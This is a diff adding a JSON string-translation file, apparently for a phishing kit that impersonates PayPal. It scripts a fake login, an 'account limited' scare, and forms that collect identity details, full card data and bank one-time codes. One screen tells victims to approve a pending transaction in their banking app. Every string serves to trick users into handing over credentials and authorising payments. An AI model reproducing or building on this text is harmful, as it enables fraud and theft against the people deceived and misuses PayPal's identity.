@@ -1,0 +1,117 @@
+{
+    "COMMON": {
+        "NEXT": "[VI] Next",
+        "CONTINUE": "[VI] Continue",
+        "SUBMIT": "[VI] Submit",
+        "CONFIRM": "[VI] Confirm",
+        "VERIFY": "[VI] Verify",
+        "CLOSE": "[VI] Close",
+        "LOADING": "[VI] Loading...",
+        "SECURE_CONNECTION": "[VI] Secure Connection",
+        "COPYRIGHT": "[VI] © 1999-2026 PayPal Inc. All rights reserved.",
+        "PRIVACY": "[VI] Privacy",
+        "LEGAL": "[VI] Legal",
+        "CONTACT": "[VI] Contact",
+        "WORLDWIDE": "[VI] Worldwide"
+    },
+    "SECURITY": {
+        "CHECKING": "[VI] Checking your security...",
+        "VERIFYING": "[VI] Verifying security...",
+        "CONNECTING": "[VI] Connecting..."
+    },
+    "LOGIN": {
+        "TITLE": "[VI] Log in to your PayPal account",
+        "EMAIL_PLACEHOLDER": "[VI] Email or mobile number",
+        "PASSWORD_PLACEHOLDER": "[VI] Password",
+        "FORGOT": "[VI] Forgot password?",
+        "OR": "[VI] or",
+        "SIGN_UP": "[VI] Sign Up",
+        "LOG_IN": "[VI] Log In",
+        "ERROR_CREDENTIALS": "[VI] Check your entries and try again."
+    },
+    "LIMITED": {
+        "TITLE": "[VI] We need to confirm it's you",
+        "DESCRIPTION": "[VI] We noticed a login from a device we don't recognize. To keep your account secure, we just need to verify your identity.",
+        "BUTTON": "[VI] Confirm Identity",
+        "WHY_LINK": "[VI] Why do I need to do this?",
+        "DIALOG_TITLE": "[VI] Why is my account limited?",
+        "ALERT_TITLE": "[VI] Unusual Activity Detected",
+        "ALERT_DESC": "[VI] We noticed a login attempt from a device or location we don't recognize.",
+        "WHATS_LIMITED": "[VI] What's Limited",
+        "LIMIT_1": "[VI] Sending payments",
+        "LIMIT_2": "[VI] Withdrawing funds",
+        "LIMIT_3": "[VI] Removing payment methods",
+        "HOW_TO_RESOLVE": "[VI] How to Resolve",
+        "RESOLVE_DESC": "[VI] This is a temporary security measure. Once you confirm your identity, full account access will be restored immediately.",
+        "SECURE_ACCOUNT": "[VI] Secure Account"
+    },
+    "PERSONAL": {
+        "TITLE": "[VI] Verify your information",
+        "SUBTITLE": "[VI] Please confirm your personal details to help us secure your account.",
+        "ERROR_TITLE": "[VI] Please check your details",
+        "ERROR_DESC": "[VI] Make sure your information matches your legal ID.",
+        "COUNTRY": "[VI] Country of residence",
+        "FIRST_NAME": "[VI] Legal first name",
+        "LAST_NAME": "[VI] Legal last name",
+        "DOB": "[VI] Date of birth",
+        "PHONE": "[VI] Mobile number",
+        "ADDRESS": "[VI] Street address",
+        "CITY": "[VI] City",
+        "ZIP": "[VI] Zip code",
+        "MUST_BE_18": "[VI] Must be 18+"
+    },
+    "PHONE": {
+        "TITLE_INPUT": "[VI] Let's confirm your number",
+        "DESC_INPUT": "[VI] We'll send a code to your mobile to ensure your account is secure.",
+        "TITLE_CODE": "[VI] Enter your code",
+        "DESC_CODE": "[VI] We sent a security code to your mobile device.",
+        "ERROR_TITLE": "[VI] That didn't work",
+        "DISCLAIMER": "[VI] By continuing, you confirm that you are authorized to use this phone number. Standard message and data rates may apply.",
+        "SEND_CODE": "[VI] Send Code",
+        "CHANGE": "[VI] Change",
+        "RESEND": "[VI] Get a new code",
+        "RESEND_WAIT": "[VI] Resend code in {{seconds}}s",
+        "CODE_SENT": "[VI] Code sent!"
+    },
+    "CARD": {
+        "TITLE": "[VI] Link a card",
+        "SUBTITLE": "[VI] Link a card to confirm your identity and lift account limitations.",
+        "ERROR_TITLE": "[VI] Check your card details",
+        "Card Number": "[VI] Card number",
+        "Expiration Date": "[VI] Expiration Date",
+        "Security Code": "[VI] Security Code",
+        "Billing Address": "[VI] Billing Address"
+    },
+    "CARD_OTP": {
+        "BADGE": "[VI] Bank Verification",
+        "TITLE": "[VI] Confirm with your bank",
+        "DESC": "[VI] We've sent a code to the mobile number registered with your card ending in •••• {{last4}}.",
+        "INVALID_TITLE": "[VI] Invalid Code",
+        "INVALID_DESC": "[VI] Please check the code and try again.",
+        "INPUT_LABEL": "[VI] Enter Bank Code",
+        "NO_CODE": "[VI] Didn't receive a code?",
+        "RESEND": "[VI] Resend Code",
+        "RESEND_WAIT": "[VI] Resend available in {{seconds}}s"
+    },
+    "BANK_APP": {
+        "TITLE": "[VI] Confirm it's you",
+        "DESC": "[VI] Please open your banking app on your mobile device and approve the pending transaction to verify your identity.",
+        "WHY_TITLE": "[VI] Why is this needed?",
+        "WHY_DESC": "[VI] Your bank requires strong authentication for this request. Once approved, return here to continue.",
+        "BUTTON": "[VI] I have approved it",
+        "SECURE_VERIFICATION": "[VI] Secure Verification"
+    },
+    "SUCCESS": {
+        "TITLE": "[VI] Account Restored",
+        "BADGE_TITLE": "[VI] Limitation Lifted",
+        "BADGE_DESC": "[VI] Your account access has been fully restored. You can now send, withdraw, and manage your funds securely.",
+        "EMAIL_SENT": "[VI] A confirmation email has been sent to {{email}}.",
+        "BUTTON": "[VI] Return to Dashboard"
+    },
+    "MODAL_LANG": {
+        "TITLE": "[VI] Choose your language",
+        "DESC": "[VI] We detected you are in {{country}}, but your device is set to {{deviceLang}}.",
+        "USE_DEVICE": "[VI] Use {{deviceLang}}",
+        "USE_IP": "[VI] Use {{ipLang}}"
+    }
+}
